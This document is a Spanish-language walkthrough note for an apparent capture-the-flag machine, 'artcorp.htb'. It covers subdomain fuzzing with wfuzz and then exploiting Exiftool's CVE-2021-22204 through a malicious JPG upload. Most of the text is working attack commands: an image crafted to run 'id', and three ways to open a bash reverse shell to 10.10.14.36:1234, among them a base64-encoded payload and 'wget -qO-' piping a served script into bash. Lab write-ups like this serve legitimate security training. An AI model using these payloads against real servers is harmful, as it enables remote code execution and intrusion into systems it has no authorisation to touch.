PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Añadimos el dominio 'artcorp.htb' al /etc/hosts

-En la página web no encontramos nada interesante

-Hacemos Fuzzing de Subdominios con wffuz:
	-wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "HOST: FUZZ.artcorp.htb" http://artcorp.htb
		**dev01** (Subdominio Encontrado!!)
 
-Añadimos el dominio **'dev01.artcorp.htb'** al /etc/hosts

-Nos vamos a dev01.artcorp.htb y nos dejan subir un Archivo 'jpg' 

-Subimos un archivo 'jpg' y nos salen los parámetros del archivo con el Output que despliega la Herramienta 'Exiftool', por lo que la están usando para validar el Contenido de la imagen que subimos.

## File Upload - Exiftool - CVE-2021-22204 - RCE

-Buscamos exploits en 'exiftool' y encontramos el siguiente CVE:
	**CVE-2021-22204 - RCE** 

-Nos clonamos el siguiente repositorio:
	https://github.com/OneSecCyber/JPEG_RCE

-Generamos una Imagen maliciosa:
	-exiftool -config eval.config runme.jpg -eval='system("id")'

-Subimos la Imagen y en la respuesta vemos que se ha ejecutado el Comando:
	**uid=33(www-data) gid=33(www-data) groups=33(www-data)**

-Generamos otra Imagen maliciosa, esta vez con una RS (3 ways):
	1-Inyectando una RS con **base64**
		1-Generamos la RS con Base64:
			-echo "bash -c 'bash -i >& /dev/tcp/10.10.14.36/1234 0>&1' | base64"
		2-Inyectamos la RS con exiftool:
			-exiftool -config eval.config runme.jpg -eval='system("echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNi8xMjM0IDA+JjEn | base64 -d | bash")'
	2-Inyectando una RS **Encapsulando bien las Comillas**:
		-exiftool -config eval.config runme.jpg -eval='system("bash -c '\''bash -i >& /dev/tcp/10.10.14.36/1234 0>&1'\''")' - La RS de bash Escapando Comillas
	3-Con **wget -qO-** y **Archivo 'index.html'**
		1-Nos creamos un archivo **'index.html'** con la RS de bash:
			![[Pasted image 20250607200210.png]]
		2-Abrimos un Servidor para Compartir el Archivo:
			-python3 -m http.server 80
		3-Hacemos una Petición al Servidor y lo Interpretamos con bash:
			-exiftool -config eval.config runme.jpg -eval='system("wget -qO- http://10.10.14.36/ | bash")'
		**-qO-:** Te permite listar el código fuente de un servidor web que tu le pasas
		**-NOTA:** La petición al Servidor interactúa por defecto con el archivo 'index.html', estamos haciendo que liste el Código Fuente del archivo y lo interprete con Bash.

3-VER EL VIDEO DE S4VITAR (WGET):
	https://www.youtube.com/watch?v=L58krS9kY_A
	1:22:10

-Después ponerlo en:
	[[Otras Formas de Ejecutar una RS]]
